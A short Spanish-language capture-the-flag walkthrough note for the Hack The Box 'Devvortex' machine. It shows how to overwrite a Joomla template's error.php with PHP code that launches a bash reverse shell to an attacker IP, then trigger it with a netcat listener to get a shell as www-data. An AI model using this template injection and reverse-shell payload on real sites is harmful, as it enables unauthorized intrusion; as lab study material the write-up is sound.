#joomla #inyecciondecodigophpentemplatejoomla

--------

Aca apretamos en *System*

![[Devvortex19.png]]
Ahora en *Site Templates*
![[Devvortex20.png]]

Y vamos a cambiar el contenido del error.php por el siguiente 

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.15/443 0>&1'");
?>
```

![[Devvortex21.png]]
Y ahora mientras estamos en escucha con [[nc -nlvp 443]] vamos entrar al siguiente link para que se ejecute el *error.php* http://dev.devvortex.htb/templates/cassiopeia/error.php
![[Devvortex22.png]]
Obtuvimos acceso como www-data